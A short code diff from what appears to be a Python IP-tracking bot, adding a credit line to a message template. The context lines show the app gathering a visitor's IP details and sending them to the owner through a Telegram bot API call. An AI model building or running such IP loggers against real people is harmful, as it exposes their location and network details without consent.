@@ -41,6 +41,7 @@ def main():
     *User is on Mobile :* `{info['mobile']}`
     *Proxy :* `{info['proxy']}`
     *Hosting :* `{info['hosting']}`
+    *BOT BY : @BUDDYBOSS*
     """
     requests.get(f'https://api.telegram.org/bot{BOT_API}/sendmessage?chat_id={OWNER_ID}&text={output}&parse_mode=Markdown')
     return jsonify({"Your IP Address ":info['query'], "Status":"IP successfully tracked."})
